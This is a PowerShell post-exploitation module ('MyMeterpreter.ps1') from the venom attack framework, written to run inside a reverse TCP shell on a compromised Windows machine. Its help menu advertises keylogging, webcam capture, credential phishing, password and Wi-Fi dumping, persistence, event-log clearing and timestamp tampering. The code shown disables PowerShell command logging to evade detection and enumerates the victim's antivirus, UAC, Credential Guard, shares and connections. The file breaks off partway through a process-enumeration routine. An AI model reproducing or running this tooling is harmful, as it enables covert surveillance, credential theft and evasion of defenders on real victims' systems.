<#
.SYNOPSIS
   CmdLet to assiste reverse tcp shells in post-exploitation

   Author: r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.0.5

.DESCRIPTION
   This cmdlet belongs to the structure of venom v1.0.17.8 as a post-exploitation module.
   venom amsi evasion agents automatically downloads this CmdLet to %TMP% directory to be
   easily accessible in our reverse tcp shell (shell prompt). So, we just need to run this
   CmdLet with the desired parameters to perform various remote actions such as:
   
   System Enumeration, Start Local WebServer to read/browse/download files, Capture desktop
   screenshots, Capture Mouse/Keyboard Clicks/Keystrokes, Upload Files, Scans for EoP entrys,
   Persiste Agents on StartUp using 'beacon home' from 'xx' to 'xx' seconds technic, Etc ..

.NOTES
   powershell -File MyMeterpreter.ps1 syntax its required to get outputs back in our reverse
   tcp shell connection, or else MyMeterpreter auxiliary will not display outputs on rev shell.

.EXAMPLE
   PS C:\> Get-Help .\MyMeterpreter.ps1 -full
   Access This CmdLet Comment_Based_Help

.EXAMPLE
   PS C:\> powershell -File MyMeterpreter.ps1 -Help parameters
   List all CmdLet parameters available

.EXAMPLE
   PS C:\> powershell -File MyMeterpreter.ps1 -Help [ Parameter Name ]
   Detailed information about Selected Parameter

.INPUTS
   None. You cannot pipe objects into MyMeterpreter.ps1

.OUTPUTS
   OS: Microsoft Windows 10 Home
   ------------------------------
   DomainName        : SKYNET\pedro
   ShellPrivs        : UserLand
   IsVirtualMachine  : False
   ClientPersistence : Disable
   Architecture      : 64 bits
   OSVersion         : 10.0.18363
   IPAddress         : 192.168.1.72
   PublicIP          : 12.923.69.25
   System32          : C:\WINDOWS\system32
   DefaultWebBrowser : Firefox (predefined)
   CmdLetWorkingDir  : C:\Users\pedro\coding\pswork
   Processor         : AMD64 Family 21 Model 101 Stepping 1
   User-Agent        : Mozilla/4.0 (compatible; MSIE 8.0; Win32)

.LINK
    https://github.com/r00t-3xp10it/venom
    https://github.com/r00t-3xp10it/venom/tree/master/aux/Sherlock.ps1
    https://github.com/r00t-3xp10it/venom/tree/master/aux/webserver.ps1
    https://github.com/r00t-3xp10it/venom/tree/master/aux/MyMeterpreter.ps1
    https://github.com/r00t-3xp10it/venom/tree/master/aux/Start-WebServer.ps1
    https://github.com/r00t-3xp10it/venom/blob/master/bin/meterpeter/mimiRatz/CredsPhish.ps1
    https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
#>

## TODO:
# fazer o download deste script para %tmp% usando o dropper
# Assim o utilizador so tem the chamar este script na rev tcp shell
# Shell Options: Get-Help powershell -File MyMeterpreter.ps1 -full


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$StartDir="$Env:USERPROFILE",
   [string]$TaskName="MyMeterpreter",
   [string]$StartWebServer="false",
   [string]$GetConnections="false",
   [string]$WifiPasswords="false",
   [string]$GetInstalled="false",
   [string]$GetPasswords="false",
   [string]$Mouselogger="false",
   [string]$Destination="false",
   [string]$GetBrowsers="false",
   [string]$ProcessName="false",
   [string]$CleanTracks="false",
   [string]$GetDnsCache="false",
   [string]$Parameters="false",
   [string]$PhishCreds="false",
   [string]$GetProcess="false",
   [string]$ApacheAddr="false",
   [string]$Storage="$Env:TMP",
   [string]$SpeakPrank="false",
   [string]$Keylogger="false",
   [string]$FileMace="false",
   [string]$GetTasks="false",
   [string]$Persiste="false",
   [string]$BruteZip="false",
   [string]$SysInfo="false",
   [string]$GetLogs="false",
   [string]$Upload="false",
   [string]$Camera="false",
   [string]$MsgBox="false",
   [string]$Date="false",
   [string]$Exec="false",
   [string]$Help="false",
   [string]$EOP="false",
   [int]$BeaconTime='10',
   [int]$ButtonType='0',
   [int]$Screenshot='0',
   [int]$Interval='10',
   [int]$SPort='8080',
   [int]$NewEst='10',
   [int]$TimeOut='5',
   [int]$Timmer='10',
   [int]$Volume='88',
   [int]$Delay='1',
   [int]$Rate='1'
)


## Global Variable declarations
$CmdletVersion = "v1.0.5"
$Remote_hostName = (hostname)
$Working_Directory = (pwd).Path
$OsVersion = [System.Environment]::OSVersion.Version
$host.UI.RawUI.WindowTitle = "@MyMeterpreter $CmdletVersion {SSA@RedTeam}"
$Address = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address.IPAddressToString
$Banner = @"

                  * Reverse TCP Shell Auxiliary Powershell Module *
 __  __ __  __ __  __  ____  _____  ____  ____  ____  ____  ____  _____  ____  ____ 
|  \/  |\ \/ /|  \/  || ===||_   _|| ===|| () )| ()_)| () )| ===||_   _|| ===|| () )
|_|\/|_| |__| |_|\/|_||____|  |_|  |____||_|\_\|_|   |_|\_\|____|  |_|  |____||_|\_\    
              Author: r00t-3xp10it - SSAredTeam @2021 - Version: $CmdletVersion
              Help: powershell -File MyMeterpreter.ps1 -Help Parameters

      
"@;
Clear-Host
Write-Host "$Banner" -ForegroundColor Blue
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$HiddePublicIPaddr = $False ## Manual => enable|disable Public-IP displays
## Helper - User Input Bad Syntax
If($Help -Match '^[-]'){## fix bad syntax
   $Help = $Help -replace '^[-]',''
}


If($Help -ieq "Parameters"){

   <#
   .SYNOPSIS
      Helper - List ALL CmdLet Parameters Available

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Help Parameters
   #>

Write-Host "  Syntax : powershell -File MyMeterpreter.ps1 [ -Parameter ] [ Argument ]"
Write-Host "  Example: powershell -File MyMeterpreter.ps1 -SysInfo Verbose -Screenshot 2"
Write-Host "`n  P4rameters        @rguments            Descripti0n" -ForegroundColor Green
Write-Host "  ---------------   ------------         ---------------------------------------"
$ListParameters = @"
  -SysInfo          Enum|Verbose         Quick System Info OR Verbose Enumeration
  -GetConnections   Enum|Verbose         Enumerate Remote Host Active TCP Connections
  -GetDnsCache      Enum|Clear           Enumerate\Clear remote host DNS cache entrys
  -GetInstalled     Enum                 Enumerate Remote Host Applications Installed
  -GetProcess       Enum|Kill            Enumerate OR Kill Remote Host Running Process(s)
  -GetTasks         Enum|Create|Delete   Enumerate\Create\Delete Remote Host Running Tasks
  -GetLogs          Enum|Verbose|Clear   Enumerate eventvwr logs OR Clear All event logs
  -GetBrowsers      Enum|Verbose         Enumerate Installed Browsers and Versions OR Verbose 
  -Screenshot       1                    Capture 1 Desktop Screenshot and Store it on %TMP%
  -Camera           Enum|Snap            Enum computer webcams OR capture default webcam snapshot 
  -StartWebServer   Python|Powershell    Downloads webserver to %TMP% and executes the WebServer.
  -Keylogger        Start|Stop           Start OR Stop recording remote host keystrokes
  -MouseLogger      Start                Capture Screenshots of Mouse Clicks for 10 seconds
  -PhishCreds       Start                Promp current user for a valid credential and leak captures
  -GetPasswords     Enum|Dump            Enumerate passwords of diferent locations {Store|Regedit|Disk}
  -WifiPasswords    Dump|ZipDump         Enum Available SSIDs OR ZipDump All Wifi passwords
  -EOP              Enum|Verbose         Find Missing Software Patchs for Privilege Escalation
  -BruteZip         `$Env:TMP\arch.zip    Brute force Zip archives with the help of 7z.exe
  -Upload           script.ps1           Upload script.ps1 from attacker apache2 webroot
  -Persiste         `$Env:TMP\script.ps1  Persiste script.ps1 on every startup {BeaconHome}
  -CleanTracks      Clear|Paranoid       Clean disk artifacts left behind {clean system tracks}
  -FileMace         `$Env:TMP\test.txt    Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
  -MsgBox           "Hello World."       Spawns "Hello World." msgBox on local host {wscriptComObject} 
  -SpeakPrank       "Hello World."       Make remote host speak user input sentence {prank}

"@;
echo $ListParameters > $Env:TMP\mytable.mt
Get-Content -Path "$Env:TMP\mytable.mt"
Remove-Item -Path "$Env:TMP\mytable.mt" -Force
Write-Host "  Help: powershell -File MyMeterpreter.ps1 -Help [ Parameter Name ]     " -ForeGroundColor black -BackGroundColor White
Write-Host ""
}

If($GetDnsCache -ieq "Enum" -or $GetDnsCache -ieq "Clear"){

   <#
   .SYNOPSIS
      Helper - Enumerate remote host DNS cache entrys
      
   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetDnsCache Enum

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetDnsCache Clear
      Clear Dns Cache entrys {delete entrys}

   .OUTPUTS
      Entry                           Data
      -----                           ----
      example.org                     93.184.216.34
      play.google.com                 216.239.38.10
      www.facebook.com                129.134.30.11
      safebrowsing.googleapis.com     172.217.21.10
   #>

   If($GetDnsCache -ieq "Enum"){## Enum dns cache
      Get-DNSClientCache|Select-Object Entry,Data|Format-Table -AutoSize > $Env:TMP\fsdgss.log
      $CheckReport = Get-Content -Path "$Env:TMP\fsdgss.log" -ErrorAction SilentlyContinue
      If($CheckReport -ieq $null){## Command fail to retrieve dns cache info
         Write-Host "[error] None DNS entrys found in $Remote_hostName\$Env:USERNAME!" -ForegroundColor Red -BackgroundColor Black
         Remove-Item -Path $Env:TMP\fsdgss.log -Force
      }Else{## Dns Cache entrys found
         Get-Content -Path $Env:TMP\fsdgss.log
         Remove-Item -Path $Env:TMP\fsdgss.log -Force   
      }
   }ElseIf($GetDnsCache -ieq "Clear"){## Clear dns cache
      ipconfig /flushdns
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){

   <#
   .SYNOPSIS
      Helper - Enumerates remote host basic system info

   .NOTES
      System info: IpAddress, OsVersion, OsFlavor, OsArchitecture,
      WorkingDirectory, CurrentShellPrivileges, ListAllDrivesAvailable
      PSCommandLogging, AntiVirusDefinitions, AntiSpywearDefinitions,
      UACsettings, WorkingDirectoryDACL, BehaviorMonitorEnabled, Etc..

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -SysInfo Enum
      Remote Host Quick Enumeration Module

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -SysInfo Verbose
      Remote Host Detailed Enumeration Module
   #>

   ## Variable declarations
   $System = (Get-WmiObject Win32_OperatingSystem).Caption
   $Version = (Get-WmiObject Win32_OperatingSystem).Version
   $NameDomain = (Get-WmiObject Win32_OperatingSystem).CSName
   $IsVirtualMachine = (Get-MpComputerStatus).IsVirtualMachine
   $MyProcessor = (Get-WmiObject Win32_processor).Caption
   $SystemDir = (Get-WmiObject Win32_OperatingSystem).SystemDirectory
   $Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
   $Publicip = (curl http://ipinfo.io/ip -UseBasicParsing).content ## Credits: @securethelogs
   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
   $UserAgentString = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object -ExpandProperty 'User Agent'
   If($IsClientAdmin){$ShellPrivs = "Admin"}Else{$ShellPrivs = "UserLand"}

   ## Get default webbrowser
   $DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice' -ErrorAction SilentlyContinue).ProgId
   If($DefaultBrowser){## Parsing registry data
      $Parse_Browser_Data = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''
   }Else{## default webbrowser reg key not found
      $Parse_Browser_Data = "Not Found"
   }

   ## Get persistence script status Persiste.vbs OR KB4524147_sgds.vbs {venom}
   $PersistePath = "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
   $GetPersisteStatus = (dir $PersistePath -EA SilentlyContinue).Name
   If($GetPersisteStatus -Like 'Persiste*.vbs' -or $GetPersisteStatus -Like 'KB4524147*.vbs'){
      $GetPersisteStatus = "Active"
   }Else{## None persistence script found in startup
      $GetPersisteStatus = "Disable"
   }

   ## Build OutPut Table
   Write-Host "OS: $System " -ForegroundColor Green
   Write-Host "------------------------------";Start-Sleep -Seconds 1
   Write-Host "DomainName        : $NameDomain\$Env:USERNAME"
   Write-Host "ShellPrivs        : $ShellPrivs" -ForegroundColor Yellow
   Write-Host "IsVirtualMachine  : $IsVirtualMachine"
   Write-Host "ClientPersistence : $GetPersisteStatus"
   Write-Host "Architecture      : $Architecture"
   Write-Host "OSVersion         : $Version"
   Write-Host "IPAddress         : $Address" -ForegroundColor Yellow
   If($HiddePublicIPaddr -eq $False){## Display Public IpAdrr
      Write-Host "PublicIP          : $Publicip"
   }
   Write-Host "System32          : $SystemDir"
   Write-Host "DefaultWebBrowser : $Parse_Browser_Data (predefined)"
   Write-Host "CmdLetWorkingDir  : $Working_Directory" -ForegroundColor Yellow
   Write-Host "Processor         : $MyProcessor"
   Write-Host "User-Agent        : $UserAgentString`n"

   ## Get ALL drives available
   Get-PsDrive -PsProvider filesystem|Select-Object Name,Root,CurrentLocation,Used,Free|Format-Table -AutoSize

   ## Get User Accounts
   Get-LocalUser|Select-Object Name,Enabled,PasswordRequired,UserMayChangePassword -EA SilentlyContinue|Format-Table


   If($SysInfo -ieq "Verbose"){## Detailed Enumeration function

      $Constrained = $ExecutionContext.SessionState.LanguageMode
      If($Constrained -ieq "ConstrainedLanguage"){
        $ConState = "Enabled"
      }Else{## disabled
        $ConState = "Disabled"
      }

      ## Local Function variable declarations
      $PSHistoryStatus = (Get-PSReadlineOption).HistorySavePath
      $AMProductVersion = (Get-MpComputerStatus).AMProductVersion
      $AMServiceEnabled = (Get-MpComputerStatus).AMServiceEnabled
      $AntivirusEnabled = (Get-MpComputerStatus).AntivirusEnabled
      $IsTamperProtected = (Get-MpComputerStatus).IsTamperProtected
      $AntispywareEnabled = (Get-MpComputerStatus).AntispywareEnabled
      $DisableScriptScanning = (Get-MpPreference).DisableScriptScanning
      $SignatureScheduleTime = (Get-MpPreference).SignatureScheduleTime
      $BehaviorMonitorEnabled = (Get-MpComputerStatus).BehaviorMonitorEnabled
      $RealTimeProtectionEnabled = (Get-MpComputerStatus).RealTimeProtectionEnabled
      $AllowedApplications = (Get-MpPreference).ControlledFolderAccessAllowedApplications
      $AntivirusSignatureLastUpdated = (Get-MpComputerStatus).AntivirusSignatureLastUpdated
      $AntispywareSignatureLastUpdated = (Get-MpComputerStatus).AntispywareSignatureLastUpdated
      $AntiVirusProduct = (Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntiVirusProduct").displayName

      <#
      .NOTES
        MyMeterpreter.ps1 Disables PS Command Logging in current session
        (while this terminal console is open). The next variable declaration
        displays to CmdLet users if the setting has sucessfuly modified ...
        Remark: PSCommandLogging will be restarted to default at CmdLet exit.
      #> $PSLoggingSession = (Get-PSReadlineOption).HistorySaveStyle #<--

      ## Get UAC settings {Notify Me, Never Notify, Allways Notify }
      # Credits: https://winaero.com/how-to-change-uac-settings-in-windows-10/
      $UacStatus = (Get-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system').EnableLUA
      $ConsentPromptBehaviorAdmin = (Get-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system').ConsentPromptBehaviorAdmin
      $ConsentPromptBehaviorUser = (Get-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system').ConsentPromptBehaviorUser

      ## Parsing UAC Registry Data
      If($ConsentPromptBehaviorAdmin -ieq "5" -and $ConsentPromptBehaviorUser -ieq "3"){
        $UacSettings = "Notify Me" ## Defaul value
      }ElseIf($ConsentPromptBehaviorAdmin -ieq "0" -and $ConsentPromptBehaviorUser -ieq "0"){
        $UacSettings = "Never Notify"
      }ElseIf($ConsentPromptBehaviorAdmin -ieq "2" -and $ConsentPromptBehaviorUser -ieq "3"){
        $UacSettings = "Allways Notify"
      }Else{## Can NOT retrive reg value
         $UacSettings = "`$null"
      }

      If($UacStatus -ieq "0"){## disabled
         $UacStatus = "False"
      }ElseIf($UacStatus -ieq "1"){## enabled
         $UacStatus = "True"
      }Else{## Can NOT retrive reg value
         $UacStatus = "`$null"
      }

      ## Get Credentials from Credential Guard
      If($OsVersion.Major -ge 10){## Not Supported on Windows >= 10
         $RegPath = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\LSA"
         $Result = Get-ItemProperty -Path "Registry::$($RegPath)" -EA SilentlyContinue -ErrorVariable GetItemPropertyError
         If(-not($GetItemPropertyError)){
            If(-not($Null -eq $Result.LsaCfgFlags)){
               If($Result.LsaCfgFlags -eq 0){
                   $Status = "disabled"
                   $Description = "Credential Guard is disabled!"
               }ElseIf($Result.LsaCfgFlags -eq 1){
                   $Status = "enabled"
                   $Description = "Credential Guard is enabled with UEFI lock!"
               }ElseIf($Result.LsaCfgFlags -eq 2){
                   $Status = "enabled"
                   $Description = "Credential Guard is enabled without UEFI lock!"
               } 
            }Else{
               $Status = "disabled"
               $Description = "Credential Guard is not configured!"
            }
         }
      }Else{
        $Status = "disabled"
        $Description = "Credential Guard is not supported on this OS!"
      }


      ## Built Output Table
      Write-Host "Default AV: $AntiVirusProduct"  -ForegroundColor Green
      Write-Host "------------------------------";Start-Sleep -Seconds 1
      Write-Host "UACEnabled                      : $UacStatus"
      Write-Host "UACSettings                     : $UacSettings"
      Write-Host "AMProductVersion                : $AMProductVersion"
      Write-Host "AMServiceEnabled                : $AMServiceEnabled"
      Write-Host "AntivirusEnabled                : $AntivirusEnabled" -ForegroundColor Yellow
      Write-Host "IsTamperProtected               : $IsTamperProtected"
      Write-Host "AntispywareEnabled              : $AntispywareEnabled"
      Write-Host "DisableScriptScanning           : $DisableScriptScanning"
      Write-Host "BehaviorMonitorEnabled          : $BehaviorMonitorEnabled"
      Write-Host "RealTimeProtectionEnabled       : $RealTimeProtectionEnabled" -ForegroundColor Yellow
      Write-Host "ConstrainedLanguage             : $ConState"
      Write-Host "SignatureScheduleTime           : $SignatureScheduleTime"
      Write-Host "AntivirusSignatureLastUpdated   : $AntivirusSignatureLastUpdated"
      Write-Host "AntispywareSignatureLastUpdated : $AntispywareSignatureLastUpdated"
      Write-Host "PowerShellCommandLogging        : $PSLoggingSession"  -ForegroundColor Yellow

      ## Loop truth $AllowedApplications
      # Make sure the var declaration is not empty
      If(-not($AllowedApplications -ieq $null)){
         ForEach($Token in $AllowedApplications){
            Write-Host "AllowedApplications             : $Token"
         }
      }

      ## Built Output Table
      Write-Host "`n`nAV: Credential Guard Status" -ForegroundColor Green
      Write-Host "------------------------------";Start-Sleep -Seconds 1
      write-host "Name        : Credential Guard"
      write-host "Status      : $Status" -ForegroundColor Yellow
      write-host "Description : $Description"

      ## Enumerate active SMB shares
      Write-Host "`n`nSMB: Enumerating shares" -ForegroundColor Green
      Write-Host "------------------------------";Start-Sleep -Seconds 1
      Get-SmbShare -EA SilentlyContinue|Select-Object Name,Path,Description|Format-Table
      If(-not($?)){## Make sure we have any results back
         Write-Host "[error] None SMB shares found under $Remote_hostName system!" -ForegroundColor Red -BackgroundColor Black
      }

      Write-Host "`n"
      ## Checks for Firewall { -StartWebServer [python] } rule existence
      Get-NetFirewallRule|Where-Object {## Rules to filter {DisplayName|Description}
         $_.DisplayName -ieq "python.exe" -and $_.Description -Match 'venom'
      }|Format-Table Action,Enabled,Profile,Description > $Env:TMP\ksjjhav.log

      $CheckLog = Get-Content -Path "$Env:TMP\ksjjhav.log" -EA SilentlyContinue
      Remove-Item -Path "$Env:TMP\ksjjhav.log" -Force
      If($CheckLog -ne $null){## StartWebServer rule found
         Write-Host "StartWebServer: firewall rule"  -ForegroundColor Green
         Write-Host "-----------------------------"
         echo $CheckLog
      }

      ## @Webserver Working dir ACL Description
      Write-Host "DCALC: CmdLet Working Directory" -ForegroundColor Green
      Write-Host "-------------------------------";Start-Sleep -Seconds 1
      $GetACLDescription = icacls "$Working_Directory"|findstr /V "processing"
      echo $GetACLDescription > $Env:TMP\ACl.log;Get-Content -Path "$Env:TMP\ACL.log"
      Remove-Item -Path "$Env:TMP\ACl.log" -Force

      ## Recently typed "run" commands
      Write-Host "`nRUNMRU: Recently 'run' commands" -ForegroundColor Green
      Write-Host "-------------------------------";Start-Sleep -Seconds 1
      $GETMRUList = reg query HKCU\software\microsoft\windows\currentversion\explorer\runmru|findstr /V "(Default)"|findstr /V "MRUList"
      If(-not($GETMRUList -Match "REG_SZ")){## Make sure $GETMRUList variable its not empty
         Write-Host "[error] None RunMru registry entrys found!" -ForegroundColor Red -BackgroundColor Black
      }Else{## RunMru registry entrys found
         $GETMRUList -replace '\\1','' -replace 'REG_SZ','' -replace 'HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\explorer\\runmru',''|? {$_.trim() -ne ""}
      }

      ## TobeContinued ..
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($MsgBox -ne "false"){

   <#
   .SYNOPSIS
      Helper - Spawn a msgBox on local host {ComObject}

   .NOTES
      Required Dependencies: Wscript ComObject {native}
      Remark: Double Quotes are Mandatory in -MsgBox value
      Remark: -TimeOut 0 parameter maintains msgbox open.

      MsgBox Button Types
      -------------------
      0 - Show OK button. 
      1 - Show OK and Cancel buttons. 
      2 - Show Abort, Retry, and Ignore buttons. 
      3 - Show Yes, No, and Cancel buttons. 
      4 - Show Yes and No buttons. 
      5 - Show Retry and Cancel buttons. 

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -MsgBox "Hello World."

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -MsgBox "Hello World." -TimeOut 4
      Spawn message box and close msgbox after 4 seconds time {-TimeOut 4}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -MsgBox "Hello World." -ButtonType 4
      Spawns message box with Yes and No buttons {-ButtonType 4}

   .OUTPUTS
      TimeOut  ButtonType           Message
      -------  ----------           -------
      5 (sec)  'Yes and No buttons' 'Hello World.'
   #>

   ## Set Button Type local var
   If($ButtonType -ieq 0){
     $Buttonflag = "'OK button'"
   }ElseIf($ButtonType -ieq 1){
     $Buttonflag = "'OK and Cancel buttons'"
   }ElseIf($ButtonType -ieq 2){
     $Buttonflag = "'Abort, Retry, and Ignore buttons'"
   }ElseIf($ButtonType -ieq 3){
     $Buttonflag = "'Yes, No, and Cancel buttons'"
   }ElseIf($ButtonType -ieq 4){
     $Buttonflag = "'Yes and No buttons'"
   }ElseIf($ButtonType -ieq 5){
     $Buttonflag = "'Retry and Cancel buttons'"
   }

   ## Create Data Table for output
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("TimeOut")|Out-Null
   $mytable.Columns.Add("ButtonType")|Out-Null
   $mytable.Columns.Add("Message")|Out-Null
   $mytable.Rows.Add("$TimeOut (sec)",
                     "$Buttonflag",
                     "'$MsgBox'")|Out-Null

   ## Display Data Table
   $mytable|Format-Table -AutoSize
   ## Execute personalized MessageBox
   (New-Object -ComObject Wscript.Shell).Popup("""$MsgBox""",$TimeOut,"""®MyMeterpreter - ${CmdletVersion}-dev""",$ButtonType+64)|Out-Null
}

If($SpeakPrank -ne "False"){
If($Rate -gt '10'){$Rate = "10"} ## Speach speed max\min value accepted
If($Volume -gt '100'){$Volume = "100"} ## Speach Volume max\min value accepted

   <#
   .SYNOPSIS
      Helper - Speak Prank {SpeechSynthesizer}

   .DESCRIPTION
      Make remote host speak user input sentence (prank)

   .NOTES
      Required Dependencies: SpeechSynthesizer {native}
      Remark: Double Quotes are Mandatory in @arg declarations
      Remark: -Volume controls the speach volume {default: 88}
      Remark: -Rate Parameter configs the SpeechSynthesizer speed

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -SpeakPrank "Hello World"
      Make remote host speak "Hello World" {-Rate 1 -Volume 88}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100

   .OUTPUTS
      RemoteHost SpeachSpeed Volume Speak        
      ---------- ----------- ------ -----        
      SKYNET     5           100    'hello world'
   #>

   ## Local Function Variable declarations
   $TimeDat = Get-Date -Format 'HH:mm:ss'
   $RawRate = "-" + "$Rate" -Join ''

   ## Create Data Table for output
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("RemoteHost")|Out-Null
   $mytable.Columns.Add("SpeachSpeed")|Out-Null
   $mytable.Columns.Add("Volume")|Out-Null
   $mytable.Columns.Add("Speak")|Out-Null
   $mytable.Rows.Add("$Remote_hostName",
                     "$Rate",
                     "$Volume",
                     "'$SpeakPrank'")|Out-Null

   ## Display Data Table
   $mytable|Format-Table -AutoSize > $Env:TMP\MyTable.log
   Get-Content -Path "$Env:TMP\MyTable.log"
   Remove-Item -Path "$Env:TMP\MyTable.log" -Force

   ## Add type assembly
   Add-Type -AssemblyName System.speech
   $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
   $speak.Volume = $Volume
   $speak.Rate = $RawRate
   $speak.Speak($SpeakPrank)
}

If($GetConnections -ieq "Enum" -or $GetConnections -ieq "Verbose"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Gets a list of ESTABLISHED connections (TCP)
   
   .DESCRIPTION
      Enumerates ESTABLISHED TCP connections and retrieves the
      ProcessName associated from the connection PID identifier
    
   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetConnections Enum

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetConnections Verbose
      Retrieves process info from the connection PID (Id) identifier

   .OUTPUTS
      Proto  Local Address          Foreign Address        State           Id
      -----  -------------          ---------------        -----           --
      TCP    127.0.0.1:58490        127.0.0.1:58491        ESTABLISHED     10516
      TCP    192.168.1.72:60547     40.67.254.36:443       ESTABLISHED     3344
      TCP    192.168.1.72:63492     216.239.36.21:80       ESTABLISHED     5512

      Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
      -------  ------    -----      -----     ------     --  -- -----------
          671      47    39564      28452       1,16  10516   4 firefox
          426      20     5020      21348       1,47   3344   0 svchost
         1135      77   252972     271880      30,73   5512   4 powershell
   #>

   Write-Host "`nProto  Local Address          Foreign Address        State           Id"
   Write-Host "-----  -------------          ---------------        -----           --"
   $TcpList = netstat -ano|findstr "ESTABLISHED LISTENING"|findstr /V "[ UDP 0.0.0.0:0"
   If($? -ieq $False){## fail to retrieve List of ESTABLISHED TCP connections!
      Write-Host "  [error] fail to retrieve List of ESTABLISHED TCP connections!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
   }

   ## Align the Table to feat next Table outputs
   # {delete empty spaces in begging of each line}
   $parsedata = $TcpList -replace '^(\s+)',''
   echo $parsedata
   
   If($GetConnections -ieq "Verbose"){## Verbose module
      Write-Host "" ## List of ProcessName + PID associated to $Tcplist
      $PidList = netstat -ano|findstr "ESTABLISHED LISTENING"|findstr /V "[ UDP 0.0.0.0:0"
      ForEach($Item in $PidList){## Loop truth ESTABLISHED connections
         echo $Item.split()[-1] >> test.log
      }
      $PPid = Get-Content -Path "test.log"
      Remove-Item -Path "test.log" -Force

      ## ESTABLISHED Connections PID (Id) Loop
      ForEach($Token in $PPid){
         Get-Process -PID $Token
      }
   }
   write-Host "";Start-Sleep -Seconds 1
}

If($GetInstalled -ieq "Enum"){

   <#
   .SYNOPSIS
     Helper - List remote host applications installed

   .DESCRIPTION
      Enumerates appl installed and respective versions

   .EXAMPLE
      PC C:\> powershell -File MyMeterpreter.ps1 -GetInstalled Enum

   .OUTPUTS
      DisplayName                   DisplayVersion     
      -----------                   --------------     
      Adobe Flash Player 32 NPAPI   32.0.0.314         
      ASUS GIFTBOX                  7.5.24
   #>

   Write-Host "$Remote_hostName Applications installed" -ForegroundColor Green
   Write-Host "-----------------------------";Start-Sleep -Seconds 1
   Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*|Select-Object DisplayName,DisplayVersion|Format-Table -AutoSize
   Start-Sleep -Seconds 1
}

If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){

   <#
   .SYNOPSIS
     Helper - Enumerate/Kill running process

   .DESCRIPTION
      This CmdLet enumerates 'All' running process if used
      only the 'Enum' @arg IF used -ProcessName parameter
      then cmdlet 'kill' or 'enum' the sellected processName.

   .EXAMPLE
      PC C:\> powershell -File MyMeterpreter.ps1 -GetProcess Enum
      Enumerate ALL Remote Host Running Process(s)

   .EXAMPLE
      PC C:\> powershell -File MyMeterpreter.ps1 -GetProcess Enum -ProcessName firefox.exe
      Enumerate firefox.exe Process {Id,Name,Path,Company,StartTime,Responding}

   .EXAMPLE
      PC C:\> powershell -File MyMeterpreter.ps1 -GetProcess Kill -ProcessName firefox.exe
      Kill Remote Host firefox.exe Running Process

   .OUTPUTS
      Id              : 8564
      Name            : ApplicationFrameHost
      Path            : C:\WINDOWS\system32\ApplicationFrameHost.exe
      Company         : Microsoft Corporation
      FileVersion     : 10.0.18362.1316 (WinBuild.160101.0800)
      MainWindowTitle : Calculadora
      StartTime       : 23/01/2021 16:01:47
      Responding      : True
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\MyMeterpreter.ps1 -GetProcess Enum"
   Write-Host "Example: .\MyMeterpreter.ps1 -GetProcess Enum -ProcessName notepad.exe"
   Write-Host "Example: .\MyMeterpreter.ps1 -GetProcess Kill -ProcessName notepad.exe`n"
   Start-Sleep -Seconds 2


   If($GetProcess -ieq "Enum" -and $ProcessName -ieq "false"){## Enumerate ALL running process(s)
      Write-Host "$Remote_hostName Running Process" -ForegroundColor Green
      Write-Host "----------------------";Start-Sleep -Seconds 1
